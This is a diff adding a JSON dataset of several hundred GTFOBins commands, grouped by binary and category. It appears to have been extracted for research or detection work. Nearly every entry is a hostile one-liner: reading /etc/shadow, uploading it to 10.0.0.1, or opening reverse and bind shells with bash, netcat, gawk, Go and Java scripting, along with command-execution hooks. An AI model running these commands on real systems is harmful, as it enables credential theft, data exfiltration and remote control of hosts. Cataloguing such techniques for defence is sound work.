@@ -1,0 +1,2182 @@
+{
+  "metadata": {
+    "source": "GTFOBins",
+    "repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+    "extraction_date": "2026-02-03",
+    "categories_included": [
+      "bind-shell",
+      "command",
+      "download",
+      "file-read",
+      "file-write",
+      "reverse-shell",
+      "upload"
+    ],
+    "categories_excluded": [
+      "capabilities",
+      "library-load",
+      "shell",
+      "sudo",
+      "suid"
+    ],
+    "total_commands": 431,
+    "total_binaries": 261
+  },
+  "commands": [
+    {
+      "command": "7z a -ttar -an -so /etc/shadow | 7z e -ttar -si -so",
+      "binary": "7z",
+      "category": "file-read"
+    },
+    {
+      "command": "ab -v2 http://10.0.0.1/etc/shadow",
+      "binary": "ab",
+      "category": "download"
+    },
+    {
+      "command": "ab -p /etc/shadow http://10.0.0.1/",
+      "binary": "ab",
+      "category": "upload"
+    },
+    {
+      "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/tmp/tempfile\nchmod +x /tmp/tempfile\nacr -r ./relative/tmp/tempfile",
+      "binary": "acr",
+      "category": "command"
+    },
+    {
+      "command": "alpine -F /etc/shadow",
+      "binary": "alpine",
+      "category": "file-read"
+    },
+    {
+      "command": "apache2 -f /etc/shadow",
+      "binary": "apache2",
+      "category": "file-read"
+    },
+    {
+      "command": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /etc/shadow'",
+      "binary": "apache2",
+      "category": "file-read"
+    },
+    {
+      "command": "apache2ctl -c 'Include /etc/shadow'",
+      "binary": "apache2ctl",
+      "category": "file-read"
+    },
+    {
+      "command": "ar r /tmp/evil /etc/shadow\nar p /tmp/evil",
+      "binary": "ar",
+      "category": "file-read"
+    },
+    {
+      "command": "echo /tmp/evil.sh >/tmp/tempfile\nchmod +x /tmp/tempfile\naria2c --on-download-error=/tmp/tempfile http://some-invalid-domain",
+      "binary": "aria2c",
+      "category": "command"
+    },
+    {
+      "command": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://10.0.0.1/aaaaaaaaaaaaaaaa",
+      "binary": "aria2c",
+      "category": "command"
+    },
+    {
+      "command": "aria2c -o /tmp/evil http://10.0.0.1/etc/shadow",
+      "binary": "aria2c",
+      "category": "download"
+    },
+    {
+      "command": "aria2c -i /etc/shadow",
+      "binary": "aria2c",
+      "category": "file-read"
+    },
+    {
+      "command": "arj a /tmp/evil /etc/shadow\narj p /tmp/evil",
+      "binary": "arj",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >output-file\narj a x output-file\narj e x /tmp/outdir/",
+      "binary": "arj",
+      "category": "file-write"
+    },
+    {
+      "command": "arp -v -f /etc/shadow",
+      "binary": "arp",
+      "category": "file-read"
+    },
+    {
+      "command": "as @/etc/shadow",
+      "binary": "as",
+      "category": "file-read"
+    },
+    {
+      "command": "ascii-xfr -ns /etc/shadow",
+      "binary": "ascii-xfr",
+      "category": "file-read"
+    },
+    {
+      "command": "ascii85 /etc/shadow | ascii85 --decode",
+      "binary": "ascii85",
+      "category": "file-read"
+    },
+    {
+      "command": "ash -c 'echo DATA >/tmp/evil'",
+      "binary": "ash",
+      "category": "file-write"
+    },
+    {
+      "command": "aspell -c /etc/shadow",
+      "binary": "aspell",
+      "category": "file-read"
+    },
+    {
+      "command": "aspell --conf /etc/shadow",
+      "binary": "aspell",
+      "category": "file-read"
+    },
+    {
+      "command": "echo /tmp/evil.sh | at now",
+      "binary": "at",
+      "category": "command"
+    },
+    {
+      "command": "atobm /etc/shadow",
+      "binary": "atobm",
+      "category": "file-read"
+    },
+    {
+      "command": "aws ec2 describe-instances --filter file:///etc/shadow",
+      "binary": "aws",
+      "category": "file-read"
+    },
+    {
+      "command": "base32 /etc/shadow | base32 --decode",
+      "binary": "base32",
+      "category": "file-read"
+    },
+    {
+      "command": "base58 /etc/shadow | base58 --decode",
+      "binary": "base58",
+      "category": "file-read"
+    },
+    {
+      "command": "base64 /etc/shadow | base64 --decode",
+      "binary": "base64",
+      "category": "file-read"
+    },
+    {
+      "command": "basenc --base64 /etc/shadow | basenc -d --base64",
+      "binary": "basenc",
+      "category": "file-read"
+    },
+    {
+      "command": "basez /etc/shadow | basez --decode",
+      "binary": "basez",
+      "category": "file-read"
+    },
+    {
+      "command": "bash -c '{ echo -ne \"GET /etc/shadow HTTP/1.0\\r\\nhost: 10.0.0.1\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/10.0.0.1/4444 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/tmp/evil'",
+      "binary": "bash",
+      "category": "download"
+    },
+    {
+      "command": "bash -c 'echo \"$(</dev/tcp/10.0.0.1/4444) >/tmp/evil'",
+      "binary": "bash",
+      "category": "download"
+    },
+    {
+      "command": "bash -c 'echo \"$(</etc/shadow)\"'",
+      "binary": "bash",
+      "category": "file-read"
+    },
+    {
+      "command": "HISTTIMEFORMAT=$'\\r\\e[K'\nhistory -c\nhistory -r /etc/shadow\nhistory",
+      "binary": "bash",
+      "category": "file-read"
+    },
+    {
+      "command": "bash -c 'echo DATA >/tmp/evil'",
+      "binary": "bash",
+      "category": "file-write"
+    },
+    {
+      "command": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w /tmp/evil",
+      "binary": "bash",
+      "category": "file-write"
+    },
+    {
+      "command": "bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'",
+      "binary": "bash",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</etc/shadow)\" >/dev/tcp/10.0.0.1/4444'",
+      "binary": "bash",
+      "category": "upload"
+    },
+    {
+      "command": "bash -c 'echo -n \"$(</etc/shadow)\" >/dev/tcp/10.0.0.1/4444'",
+      "binary": "bash",
+      "category": "upload"
+    },
+    {
+      "command": "bc -s /etc/shadow\nquit",
+      "binary": "bc",
+      "category": "file-read"
+    },
+    {
+      "command": "bconsole -c /etc/shadow",
+      "binary": "bconsole",
+      "category": "file-read"
+    },
+    {
+      "command": "bridge -b /etc/shadow",
+      "binary": "bridge",
+      "category": "file-read"
+    },
+    {
+      "command": "busybox nc -e /bin/sh 10.0.0.1 4444",
+      "binary": "busybox",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "busybox httpd -f -p 4444 -h .",
+      "binary": "busybox",
+      "category": "upload"
+    },
+    {
+      "command": "bzip2 -c /etc/shadow | bzip2 -d",
+      "binary": "bzip2",
+      "category": "file-read"
+    },
+    {
+      "command": "cancel -h 10.0.0.1:4444 -u DATA",
+      "binary": "cancel",
+      "category": "upload"
+    },
+    {
+      "command": "cat /etc/shadow",
+      "binary": "cat",
+      "category": "file-read"
+    },
+    {
+      "command": "check_cups --extra-opts=@/etc/shadow",
+      "binary": "check_cups",
+      "category": "file-read"
+    },
+    {
+      "command": "check_log -F /etc/shadow -O /dev/stdout",
+      "binary": "check_log",
+      "category": "file-read"
+    },
+    {
+      "command": "check_log -F /etc/shadow -O /tmp/evil",
+      "binary": "check_log",
+      "category": "file-write"
+    },
+    {
+      "command": "check_memory --extra-opts=@/etc/shadow",
+      "binary": "check_memory",
+      "category": "file-read"
+    },
+    {
+      "command": "check_raid --extra-opts=@/etc/shadow",
+      "binary": "check_raid",
+      "category": "file-read"
+    },
+    {
+      "command": "check_statusfile /etc/shadow",
+      "binary": "check_statusfile",
+      "category": "file-read"
+    },
+    {
+      "command": "touch x.yara\nclamscan --no-summary -d x.yara -f /etc/shadow 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'",
+      "binary": "clamscan",
+      "category": "file-read"
+    },
+    {
+      "command": "cmake -E cat /etc/shadow",
+      "binary": "cmake",
+      "category": "file-read"
+    },
+    {
+      "command": "cmp /etc/shadow /dev/zero -b -l",
+      "binary": "cmp",
+      "category": "file-read"
+    },
+    {
+      "command": "column /etc/shadow",
+      "binary": "column",
+      "category": "file-read"
+    },
+    {
+      "command": "comm /etc/shadow /dev/null",
+      "binary": "comm",
+      "category": "file-read"
+    },
+    {
+      "command": "cp /etc/shadow /dev/stdout",
+      "binary": "cp",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | cp /dev/stdin /tmp/evil",
+      "binary": "cp",
+      "category": "file-write"
+    },
+    {
+      "command": "echo /etc/shadow | cpio -o",
+      "binary": "cpio",
+      "category": "file-read"
+    },
+    {
+      "command": "echo /etc/shadow | cpio -dp .\ncat path/to/input-file",
+      "binary": "cpio",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\necho /tmp/tempfile | cpio -udp .",
+      "binary": "cpio",
+      "category": "file-write"
+    },
+    {
+      "command": "CRASHPAGER=/tmp/evil.sh crash -h",
+      "binary": "crash",
+      "category": "command"
+    },
+    {
+      "command": "crontab -e",
+      "binary": "crontab",
+      "category": "command"
+    },
+    {
+      "command": "csh -c 'echo DATA >/tmp/evil'",
+      "binary": "csh",
+      "category": "file-write"
+    },
+    {
+      "command": "csplit /etc/shadow 1\ncat xx01",
+      "binary": "csplit",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\ncsplit -z -b %doutput-file' /tmp/tempfile 1",
+      "binary": "csplit",
+      "category": "file-write"
+    },
+    {
+      "command": "csvtool trim t /etc/shadow",
+      "binary": "csvtool",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\ncsvtool trim t /tmp/tempfile -o /tmp/evil",
+      "binary": "csvtool",
+      "category": "file-write"
+    },
+    {
+      "command": "cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow",
+      "binary": "cupsfilter",
+      "category": "file-read"
+    },
+    {
+      "command": "curl http://10.0.0.1/etc/shadow -o /tmp/evil",
+      "binary": "curl",
+      "category": "download"
+    },
+    {
+      "command": "curl file:///etc/shadow",
+      "binary": "curl",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\ncurl file:///tmp/tempfile -o /tmp/evil",
+      "binary": "curl",
+      "category": "file-write"
+    },
+    {
+      "command": "curl -X POST --data-binary @/etc/shadow http://10.0.0.1",
+      "binary": "curl",
+      "category": "upload"
+    },
+    {
+      "command": "curl -X POST --data-binary DATA http://10.0.0.1",
+      "binary": "curl",
+      "category": "upload"
+    },
+    {
+      "command": "curl gopher://10.0.0.1:4444/_DATA",
+      "binary": "curl",
+      "category": "upload"
+    },
+    {
+      "command": "cut -d '' -f1 /etc/shadow",
+      "binary": "cut",
+      "category": "file-read"
+    },
+    {
+      "command": "dash -c 'echo DATA >/tmp/evil'",
+      "binary": "dash",
+      "category": "file-write"
+    },
+    {
+      "command": "date -f /etc/shadow",
+      "binary": "date",
+      "category": "file-read"
+    },
+    {
+      "command": "dd if=/etc/shadow",
+      "binary": "dd",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | dd of=/tmp/evil",
+      "binary": "dd",
+      "category": "file-write"
+    },
+    {
+      "command": "dialog --textbox /etc/shadow 0 0",
+      "binary": "dialog",
+      "category": "file-read"
+    },
+    {
+      "command": "diff --line-format=%L /dev/null /etc/shadow",
+      "binary": "diff",
+      "category": "file-read"
+    },
+    {
+      "command": "diff --recursive /tmp/empty /etc/",
+      "binary": "diff",
+      "category": "file-read"
+    },
+    {
+      "command": "dig -f /etc/shadow",
+      "binary": "dig",
+      "category": "file-read"
+    },
+    {
+      "command": "dmesg -rF /etc/shadow",
+      "binary": "dmesg",
+      "category": "file-read"
+    },
+    {
+      "command": "dmidecode --no-sysfs -d x.dmi --dump-bin /tmp/evil",
+      "binary": "dmidecode",
+      "category": "file-write"
+    },
+    {
+      "command": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*",
+      "binary": "dnf",
+      "category": "command"
+    },
+    {
+      "command": "dnsmasq --conf-script='/tmp/evil.sh 1>&2'",
+      "binary": "dnsmasq",
+      "category": "command"
+    },
+    {
+      "command": "docker cp /etc/shadow $CONTAINER_ID:input-file\ndocker cp $CONTAINER_ID:input-file /tmp/tempfile\ncat /tmp/tempfile",
+      "binary": "docker",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\ndocker cp /tmp/tempfile $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /tmp/evil",
+      "binary": "docker",
+      "category": "file-write"
+    },
+    {
+      "command": "dos2unix -f -O /etc/shadow",
+      "binary": "dos2unix",
+      "category": "file-read"
+    },
+    {
+      "command": "dos2unix -f -n /etc/shadow /tmp/evil",
+      "binary": "dos2unix",
+      "category": "file-write"
+    },
+    {
+      "command": "dosbox -c 'mount c /' -c 'type c:\\path\\to\\input'",
+      "binary": "dosbox",
+      "category": "file-read"
+    },
+    {
+      "command": "dosbox -c 'mount c /' -c 'copy c:\\path\\to\\input c:\\path\\to\\output' -c exit\ncat /tmp/output",
+      "binary": "dosbox",
+      "category": "file-read"
+    },
+    {
+      "command": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit",
+      "binary": "dosbox",
+      "category": "file-write"
+    },
+    {
+      "command": "dotnet fsi\nSystem.IO.File.ReadAllText(\"/etc/shadow\");;",
+      "binary": "dotnet",
+      "category": "file-read"
+    },
+    {
+      "command": "ed /etc/shadow\n,p\nq",
+      "binary": "ed",
+      "category": "file-read"
+    },
+    {
+      "command": "ed /tmp/evil\na\nDATA\n.\nw\nq",
+      "binary": "ed",
+      "category": "file-write"
+    },
+    {
+      "command": "efax -d /etc/shadow",
+      "binary": "efax",
+      "category": "file-read"
+    },
+    {
+      "command": "grep '' /etc/shadow",
+      "binary": "egrep",
+      "category": "file-read"
+    },
+    {
+      "command": "elvish -c 'print (slurp </etc/shadow)'",
+      "binary": "elvish",
+      "category": "file-read"
+    },
+    {
+      "command": "elvish -c 'print DATA >/tmp/evil'",
+      "binary": "elvish",
+      "category": "file-write"
+    },
+    {
+      "command": "emacs /etc/shadow",
+      "binary": "emacs",
+      "category": "file-read"
+    },
+    {
+      "command": "emacs /tmp/evil\nDATA\nC-x C-s",
+      "binary": "emacs",
+      "category": "file-write"
+    },
+    {
+      "command": "eqn /etc/shadow",
+      "binary": "eqn",
+      "category": "file-read"
+    },
+    {
+      "command": "espeak -qXf /etc/shadow",
+      "binary": "espeak",
+      "category": "file-read"
+    },
+    {
+      "command": "exiftool -filename=/tmp/evil /etc/shadow\ncat /tmp/evil",
+      "binary": "exiftool",
+      "category": "file-read"
+    },
+    {
+      "command": "exiftool -filename=/tmp/evil /etc/shadow",
+      "binary": "exiftool",
+      "category": "file-write"
+    },
+    {
+      "command": "exiftool \"-description<=/etc/shadow --filename /tmp/evil",
+      "binary": "exiftool",
+      "category": "file-write"
+    },
+    {
+      "command": "exiftool \"-description=DATA --filename /tmp/evil",
+      "binary": "exiftool",
+      "category": "file-write"
+    },
+    {
+      "command": "exiftool -description -W /tmp/evil --filename /etc/shadow",
+      "binary": "exiftool",
+      "category": "file-write"
+    },
+    {
+      "command": "expand /etc/shadow",
+      "binary": "expand",
+      "category": "file-read"
+    },
+    {
+      "command": "expect /etc/shadow",
+      "binary": "expect",
+      "category": "file-read"
+    },
+    {
+      "command": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /tmp/evil.sh\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x",
+      "binary": "fail2ban-client",
+      "category": "command"
+    },
+    {
+      "command": "cat >/tmp/tempdir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/tmp/tempdir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /tmp/tempdir/action.d/\ncat >/tmp/tempdir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /tmp/evil.sh\nEOF\n\nmkdir -p /tmp/tempdir/filter.d/\ncat >/tmp/tempdir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /tmp/tempdir/ -v restart",
+      "binary": "fail2ban-client",
+      "category": "command"
+    },
+    {
+      "command": "file -f /etc/shadow",
+      "binary": "file",
+      "category": "file-read"
+    },
+    {
+      "command": "file -m /etc/shadow",
+      "binary": "file",
+      "category": "file-read"
+    },
+    {
+      "command": "find /etc/shadow -exec cat {} \\;",
+      "binary": "find",
+      "category": "file-read"
+    },
+    {
+      "command": "find / -fprintf /tmp/evil DATA -quit",
+      "binary": "find",
+      "category": "file-write"
+    },
+    {
+      "command": "finger x@10.0.0.1",
+      "binary": "finger",
+      "category": "download"
+    },
+    {
+      "command": "finger DATA@10.0.0.1",
+      "binary": "finger",
+      "category": "upload"
+    },
+    {
+      "command": "fmt -pNON_EXISTING_PREFIX /etc/shadow",
+      "binary": "fmt",
+      "category": "file-read"
+    },
+    {
+      "command": "fmt -999 /etc/shadow",
+      "binary": "fmt",
+      "category": "file-read"
+    },
+    {
+      "command": "fold -w999 /etc/shadow",
+      "binary": "fold",
+      "category": "file-read"
+    },
+    {
+      "command": "fping -f /etc/shadow",
+      "binary": "fping",
+      "category": "file-read"
+    },
+    {
+      "command": "ftp -a 10.0.0.1\nget /etc/shadow output-file",
+      "binary": "ftp",
+      "category": "download"
+    },
+    {
+      "command": "ftp -a 10.0.0.1\nput /etc/shadow output-file",
+      "binary": "ftp",
+      "category": "upload"
+    },
+    {
+      "command": "fzf --listen=4444",
+      "binary": "fzf",
+      "category": "command"
+    },
+    {
+      "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/4444/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
+      "binary": "gawk",
+      "category": "bind-shell"
+    },
+    {
+      "command": "gawk '//' /etc/shadow",
+      "binary": "gawk",
+      "category": "file-read"
+    },
+    {
+      "command": "gawk 'BEGIN { print \"DATA\" > \"/tmp/evil\" }'",
+      "binary": "gawk",
+      "category": "file-write"
+    },
+    {
+      "command": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/10.0.0.1/4444\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",
+      "binary": "gawk",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "gcc -x c -E /etc/shadow",
+      "binary": "gcc",
+      "category": "file-read"
+    },
+    {
+      "command": "gcc @/etc/shadow",
+      "binary": "gcc",
+      "category": "file-read"
+    },
+    {
+      "command": "gcc -x c /dev/null -o /etc/shadow",
+      "binary": "gcc",
+      "category": "file-write"
+    },
+    {
+      "command": "gcore $PID",
+      "binary": "gcore",
+      "category": "file-read"
+    },
+    {
+      "command": "gdb -nx -ex 'dump value /tmp/evil \"DATA\"' -ex quit",
+      "binary": "gdb",
+      "category": "file-write"
+    },
+    {
+      "command": "genisoimage -q -o - /etc/shadow",
+      "binary": "genisoimage",
+      "category": "file-read"
+    },
+    {
+      "command": "genisoimage -sort /etc/shadow",
+      "binary": "genisoimage",
+      "category": "file-read"
+    },
+    {
+      "command": "git diff /dev/null /etc/shadow",
+      "binary": "git",
+      "category": "file-read"
+    },
+    {
+      "command": "git apply --unsafe-paths --directory / x.patch",
+      "binary": "git",
+      "category": "file-write"
+    },
+    {
+      "command": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\taddr := &syscall.SockaddrInet4{Port: 4444}\\n\\tcopy(addr.Addr[:], []byte{0,0,0,0})\\n\\tsyscall.Bind(fd, addr)\\n\\tsyscall.Listen(fd, 1)\\n\\tnfd, _, _ := syscall.Accept(fd)\\n\\tsyscall.Dup2(nfd, 0)\\n\\tsyscall.Dup2(nfd, 1)\\n\\tsyscall.Dup2(nfd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
+      "binary": "go",
+      "category": "bind-shell"
+    },
+    {
+      "command": "echo -e 'package main\\nimport (\\n\\t\"fmt\"\\n\\t\"os\"\\n)\\n\\nfunc main(){\\n\\tb, _ := os.ReadFile(\"/etc/shadow\")\\n\\tfmt.Print(string(b))\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
+      "binary": "go",
+      "category": "file-read"
+    },
+    {
+      "command": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/tmp/evil\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
+      "binary": "go",
+      "category": "file-write"
+    },
+    {
+      "command": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"net\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\tip := net.ParseIP(\"10.0.0.1\").To4()\\n\\taddr := &syscall.SockaddrInet4{Port: 4444}\\n\\tcopy(addr.Addr[:], ip)\\n\\tsyscall.Connect(fd, addr)\\n\\tsyscall.Dup2(fd, 0)\\n\\tsyscall.Dup2(fd, 1)\\n\\tsyscall.Dup2(fd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
+      "binary": "go",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "gtester DATA -o /tmp/evil",
+      "binary": "gtester",
+      "category": "file-write"
+    },
+    {
+      "command": "gzip -c /etc/shadow | gzip -d",
+      "binary": "gzip",
+      "category": "file-read"
+    },
+    {
+      "command": "echo -n DATA | tee /usr/share/wordlists/rockyou.txt | md5sum | awk '{print $1}' >/tmp/hash.txt\nhashcat -m 0 --quiet --potfile-disable -o /tmp/evil --outfile-format=2 --outfile-autohex-disable /tmp/hash.txt /usr/share/wordlists/rockyou.txt",
+      "binary": "hashcat",
+      "category": "file-write"
+    },
+    {
+      "command": "head -c-0 /etc/shadow",
+      "binary": "head",
+      "category": "file-read"
+    },
+    {
+      "command": "hd /etc/shadow",
+      "binary": "hexdump",
+      "category": "file-read"
+    },
+    {
+      "command": "highlight --no-doc --failsafe /etc/shadow",
+      "binary": "highlight",
+      "category": "file-read"
+    },
+    {
+      "command": "hping3 10.0.0.1 --icmp --data 999 --sign xxx --file /etc/shadow",
+      "binary": "hping3",
+      "category": "upload"
+    },
+    {
+      "command": "iconv -f 8859_1 -t 8859_1 /etc/shadow",
+      "binary": "iconv",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /tmp/evil",
+      "binary": "iconv",
+      "category": "file-write"
+    },
+    {
+      "command": "ip -force -batch /etc/shadow",
+      "binary": "ip",
+      "category": "file-read"
+    },
+    {
+      "command": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /tmp/evil",
+      "binary": "iptables-save",
+      "category": "file-write"
+    },
+    {
+      "command": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://10.0.0.1/etc/shadow');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/tmp/evil');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();",
+      "binary": "jjs",
+      "category": "download"
+    },
+    {
+      "command": "jjs\nvar BufferedReader = Java.type('java.io.BufferedReader');\nvar FileReader = Java.type('java.io.FileReader');\nvar br = new BufferedReader(new FileReader('/etc/shadow'));\nwhile ((line = br.readLine()) != null) { print(line); }",
+      "binary": "jjs",
+      "category": "file-read"
+    },
+    {
+      "command": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/tmp/evil');\nfw.write('DATA');\nfw.close();",
+      "binary": "jjs",
+      "category": "file-write"
+    },
+    {
+      "command": "jjs\nvar host='10.0.0.1';\nvar port=4444;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();",
+      "binary": "jjs",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "join -a 2 /dev/null /etc/shadow",
+      "binary": "join",
+      "category": "file-read"
+    },
+    {
+      "command": "jq -Rr . /etc/shadow",
+      "binary": "jq",
+      "category": "file-read"
+    },
+    {
+      "command": "jrunscript -e 'cp(\"http://10.0.0.1/etc/shadow\",\"/tmp/evil\")'",
+      "binary": "jrunscript",
+      "category": "download"
+    },
+    {
+      "command": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/etc/shadow\"));\n    while ((line = br.readLine()) != null) { print(line); }'",
+      "binary": "jrunscript",
+      "category": "file-read"
+    },
+    {
+      "command": "jrunscript -e 'var fw=new java.io.FileWriter(\"/tmp/evil\");\n    fw.write(\"DATA\");\n    fw.close();'",
+      "binary": "jrunscript",
+      "category": "file-write"
+    },
+    {
+      "command": "jrunscript -e 'var host=\"10.0.0.1\";\n    var port=4444;\n    var p=new java.lang.ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'",
+      "binary": "jrunscript",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "jshell\njshell> /open /etc/shadow",
+      "binary": "jshell",
+      "category": "file-read"
+    },
+    {
+      "command": "jshell\nString x = \"DATA\";\n/save /tmp/evil",
+      "binary": "jshell",
+      "category": "file-write"
+    },
+    {
+      "command": "julia -e 'download(\"http://10.0.0.1/etc/shadow\", \"/tmp/evil\")'",
+      "binary": "julia",
+      "category": "download"
+    },
+    {
+      "command": "julia -e 'print(open(f->read(f, String), \"/etc/shadow\"))'",
+      "binary": "julia",
+      "category": "file-read"
+    },
+    {
+      "command": "julia -e 'open(f->write(f, \"DATA\"), /tmp/evil, \"w\")'",
+      "binary": "julia",
+      "category": "file-write"
+    },
+    {
+      "command": "julia -e 'using Sockets; sock=connect(\"10.0.0.1\", parse(Int64, 4444)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",
+      "binary": "julia",
+      "category": "reverse-shell"
+    },
+    {
+      "command": "ksshell -i /etc/shadow",
+      "binary": "ksshell",
+      "category": "file-read"
+    },
+    {
+      "command": "kubectl proxy --address=0.0.0.0 --port=4444 --www=/tmp/dir/ --www-prefix=/x/",
+      "binary": "kubectl",
+      "category": "upload"
+    },
+    {
+      "command": "last -a -f /etc/shadow",
+      "binary": "last",
+      "category": "file-read"
+    },
+    {
+      "command": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}'\nstrings texput.dvi",
+      "binary": "latex",
+      "category": "file-read"
+    },
+    {
+      "command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'",
+      "binary": "latex",
+      "category": "file-write"
+    },
+    {
+      "command": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}' >/tmp/tempfile\nlatexmk -dvi /tmp/tempfile\nstrings temp-file.dvi",
+      "binary": "latexmk",
+      "category": "file-read"
+    },
+    {
+      "command": "cp /tmp/evil.sh ~/.lessfilter\nless /etc/hosts",
+      "binary": "less",
+      "category": "command"
+    },
+    {
+      "command": "LESSOPEN='/tmp/evil.sh # %s' less /etc/hosts",
+      "binary": "less",
+      "category": "command"
+    },
+    {
+      "command": "less /etc/shadow",
+      "binary": "less",
+      "category": "file-read"
+    },
+    {
+      "command": "less /etc/hosts\n:e /etc/shadow",
+      "binary": "less",
+      "category": "file-read"
+    },
+    {
+      "command": "LESSOPEN='echo /etc/shadow # %s' less /etc/hosts",
+      "binary": "less",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | less\ns/tmp/evil\nq",
+      "binary": "less",
+      "category": "file-write"
+    },
+    {
+      "command": "links /etc/shadow",
+      "binary": "links",
+      "category": "file-read"
+    },
+    {
+      "command": "logrotate /etc/shadow",
+      "binary": "logrotate",
+      "category": "file-read"
+    },
+    {
+      "command": "logrotate -l /tmp/evil DATA",
+      "binary": "logrotate",
+      "category": "file-write"
+    },
+    {
+      "command": "look '' /etc/shadow",
+      "binary": "look",
+      "category": "file-read"
+    },
+    {
